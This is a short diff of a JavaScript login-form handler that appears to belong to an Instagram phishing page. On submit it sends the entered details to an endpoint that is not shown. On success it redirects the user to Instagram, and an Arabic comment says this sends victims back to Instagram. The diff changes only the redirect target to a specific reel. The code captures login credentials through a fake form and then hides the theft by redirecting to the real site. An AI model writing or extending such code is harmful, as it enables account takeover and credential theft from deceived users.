@@ -29,7 +29,7 @@ document.getElementById('login-form').addEventListener('submit', function(e) {
         }),
     }).then(response => {
         if (response.ok) {
-            window.location.href = 'https://www.instagram.com'; // يعاود يديهم لإنستغرام
+            window.location.href = 'https://www.instagram.com/reel/DGrj0x4IUpI/?igsh=YzJxM2tremRveTVk'; // يعاود يديهم لإنستغرام
         } else {
             alert('خطأ في الإرسال، حاول مرة أخرى.');
         }
